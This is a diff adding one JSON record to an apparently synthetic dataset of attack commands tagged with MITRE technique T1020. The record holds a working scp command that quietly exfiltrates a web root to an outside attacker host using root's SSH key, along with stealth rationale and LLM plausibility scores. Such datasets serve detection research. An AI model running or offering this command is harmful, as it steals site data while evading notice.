@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "scp -q -C -l 300 -i /root/.ssh/id_rsa -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r /var/www/html attacker@198.51.100.10:/var/tmp/.cache/www_html >/dev/null 2>&1",
+  "explanation": "Recursively exfiltrates the web root using scp with compression and bandwidth throttling to minimize detection while operating non-interactively.",
+  "rationale_steps": [
+    "Use -r to recursively copy the target directory without creating local archives.",
+    "Enable -C to compress on-the-fly and -l to limit bandwidth for stealth.",
+    "Authenticate via SSH key and suppress host key prompts to run unattended.",
+    "Run in quiet mode and redirect output to avoid visible progress or logs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-a13b64e2",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The scp command uses valid flags (-q -C -l -i -P -o -r), proper redirection, and is well-formed with no quoting or parsing issues.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly performs recursive SSH-based exfiltration with compression, throttling, and non-interactive options, but relies on access to /root/.ssh/id_rsa and the existence of the remote parent directory, which may not be true.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:46:08.466325Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid SCP syntax, properly formatted flags, balanced quotes, and correct redirection operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the Automated Exfiltration technique by using SCP to transfer web content to an external server with bandwidth throttling (-l 300), compression (-C), quiet mode (-q), and redirection to hide output, making it operationally plausible for stealthy data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:46:11.587282Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid syntax, correct flags, arguments, and proper shell redirection.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command's design perfectly aligns with automated exfiltration and its options support stealth and non-interactivity, the stated 'Privilege: None' contradicts the use of '-i /root/.ssh/id_rsa', making it operationally implausible for an unprivileged user.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T05:50:15.793637Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
